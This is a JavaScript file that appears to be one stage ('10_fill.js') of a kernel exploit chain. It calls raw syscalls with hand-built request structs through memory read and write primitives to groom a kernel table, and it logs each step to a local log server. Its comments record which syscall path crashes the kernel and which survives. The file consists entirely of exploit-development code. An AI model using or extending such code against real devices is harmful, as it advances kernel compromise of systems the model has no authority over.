// 10_fill.js — table fill via submit_cmd (0x29D MULTI_READ), the engine's path.
// submit (0x295) crashes; submit_cmd zeros lived. Valid structs, paced.
(async () => {
    const LOG_HOST = "192.168.0.163";
    const say = (s) => { try { log("[f10] " + s); } catch (e) {} };
    const shout = (s) => { try { send_notification(s); } catch (e) {} };
    try { LOG_SERVER = "http://" + LOG_HOST + ":8080/log"; } catch (e) {}
    try { if (typeof checkLogServer === "function") await checkLogServer(); } catch (e) {}
    const pace = () => new Promise((r) => setTimeout(r, 500));
    const step = async (tag, fn) => {
        shout("f10: " + tag); say(tag); await pace();
        try { const r = await fn(); shout(("f10: " + tag + "=" + String(r)).slice(0,110)); say(tag + "=" + String(r)); await pace(); return r; }
        catch (e) { shout("f10: " + tag + " THREW"); say(tag + " threw"); await pace(); return null; }
    };
    await step("start", async () => "go");
    await step("init", async () => await syscall(0x29En, 0n,0n,0n,0n,0n,0n));
    let fda = -1;
    await step("sockpair", async () => {
        const sv = malloc(8); write64(sv, 0n);
        const r = await syscall(0x35n, 1n, 1n, 0n, sv, 0n, 0n);
        try {
            const v = read64(sv);
            fda = Number(v & 0xFFFFFFFFn);
            return String(r) + " fdA=" + fda;
        } catch (e) { return String(r) + " sv-unreadable"; }
    });
    await step("subcmd", async () => {
        const RB = 0x28;
        const reqs = malloc(RB * 2);
        for (let i = 0; i < RB * 2; i += 8) write64(reqs + BigInt(i), 0n);
        for (let i = 0; i < 2; i++) write32(reqs + BigInt(i * RB + 0x20), fda >= 0 ? fda : 0);
        const ids = malloc(8);
        write32(ids, 0n); write32(ids + 4n, 0n);
        const r = await syscall(0x29Dn, 0x1001n, reqs, 2n, 3n, ids, 0n);
        let out = "";
        try { out = " ids=" + Number(read32(ids)) + "," + Number(read32(ids + 4n)); } catch (e) {}
        return String(r) + out;
    });
    await step("done", async () => "ok");
})()
